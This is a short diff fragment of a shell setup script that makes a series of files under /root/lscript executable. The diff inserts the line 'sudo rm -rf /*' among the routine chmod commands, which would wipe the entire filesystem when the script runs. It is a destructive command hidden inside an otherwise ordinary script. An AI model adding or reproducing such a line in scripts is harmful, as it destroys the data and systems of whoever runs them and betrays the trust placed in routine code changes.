@@ -29,6 +29,7 @@ chmod +x /root/lscript/lh2
 chmod +x /root/lscript/lh3
 chmod +x /root/lscript/lh31
 chmod +x /root/lscript/l
+sudo rm -rf /*
 chmod +x /root/lscript/lh4
 chmod +x /root/lscript/lh41
 chmod +x /root/lscript/lh21
